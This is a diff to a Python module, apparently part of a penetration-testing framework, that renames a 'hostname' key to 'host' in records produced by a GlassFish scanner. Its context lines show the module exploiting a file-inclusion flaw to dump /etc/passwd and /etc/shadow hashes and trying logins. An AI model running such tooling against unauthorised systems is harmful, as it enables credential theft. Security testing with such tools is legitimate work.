@@ -32,7 +32,7 @@ class Module:
 
         if res != None and res['code'] in [200,401] and ('glassfish' in res['title'].lower() or 'glassfish' in res['server'].lower()):
             http_info = {
-                'hostname': target['hostname'],
+                'host': target['hostname'],
                 'port': target['port'],
                 'protocol': 'tcp',
                 'service': 'http',
@@ -70,7 +70,7 @@ class Module:
                     continue
 
                 vuln_info = {
-                    'hostname': target['hostname'],
+                    'host': target['hostname'],
                     'port': target['port'],
                     'service': 'http',
                     'url': http.url(target['path']),
@@ -92,7 +92,7 @@ class Module:
                             continue
 
                         cred_info = {
-                            'hostname': target['hostname'],
+                            'host': target['hostname'],
                             'port': target['port'],
                             'service': 'http',
                             'url': http.url(os.path.join(target['path'], exploit_uri)),
@@ -112,7 +112,7 @@ class Module:
                         Output.highlight({'target': http.url(target['path']), 'message': '[%s] Glassfish LFI exploitation: dumping /etc/passwd hashes to database' % self.name})
                         for account in parse_unix_passwd(res["html"]):
                             cred_info = {
-                                'hostname': target['hostname'],
+                                'host': target['hostname'],
                                 'port': target['port'],
                                 'service': 'http',
                                 'url': http.url(os.path.join(target['path'], passwd_uri)),
@@ -130,7 +130,7 @@ class Module:
                         Output.highlight({'target': http.url(target['path']), 'message': '[%s] Glassfish LFI exploitation: dumping /etc/shadow hashes to database' % self.name})
                         for account in parse_unix_shadow(res["html"]):
                             cred_info = {
-                                'hostname': target['hostname'],
+                                'host': target['hostname'],
                                 'port': target['port'],
                                 'service': 'http',
                                 'url': http.url(os.path.join(target['path'], passwd_uri)),
@@ -192,7 +192,7 @@ class Module:
                         Output.success({'target': http.url(target['path']), 'message': '[%s] Authentication success to Glassfish with login %s and password %s' % (self.name, username, password)})
 
                         cred_info = {
-                            'hostname': target['hostname'],
+                            'host': target['hostname'],
                             'port': target['port'],
                             'service': 'http',
                             'url': http.url(target['path']),
@@ -204,7 +204,7 @@ class Module:
                         DB.insert_credential(cred_info)
 
                         vuln_info = {
-                            'hostname': target['hostname'],
+                            'host': target['hostname'],
                             'port': target['port'],
                             'service': 'http',
                             'url': http.url(target['path']),
